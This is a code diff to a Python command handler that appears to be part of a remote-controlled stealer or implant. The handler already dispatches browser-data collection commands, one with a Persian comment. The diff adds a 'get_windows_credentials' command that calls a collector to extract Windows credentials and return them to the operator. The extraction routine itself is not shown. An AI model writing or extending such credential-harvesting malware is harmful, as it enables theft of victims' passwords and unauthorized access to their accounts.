@@ -107,6 +107,7 @@ class CommandHandler:
             'collect_browser_data_comprehensive': CommandHandler.handle_collect_browser_data_comprehensive,
             'get_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,  # نام جایگزین
             'get_comprehensive_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,
+            'get_windows_credentials': CommandHandler.handle_windows_credentials,
         }
 
         handler = handlers.get(command_type)
@@ -140,6 +141,32 @@ class CommandHandler:
             return error_result
 
     # ==================== HANDLERS FOR NEW COMMANDS ====================
+
+    @staticmethod
+    def handle_windows_credentials(params):
+        """Handle Windows credential extraction command"""
+        try:
+            logging.info("Handling Windows credentials extraction command")
+
+            from system.collector import SystemCollector
+            collector = SystemCollector()
+
+            credentials = collector.collect_windows_credentials()
+
+            return {
+                "status": "success",
+                "message": "Windows credentials extracted successfully",
+                "credentials": credentials,
+                "timestamp": datetime.now().isoformat()
+            }
+
+        except Exception as e:
+            logging.error(f"Windows credentials extraction failed: {str(e)}")
+            return {
+                "status": "error",
+                "message": f"Windows credentials extraction failed: {str(e)}",
+                "timestamp": datetime.now().isoformat()
+            }
 
     @staticmethod
     def handle_get_info(params):
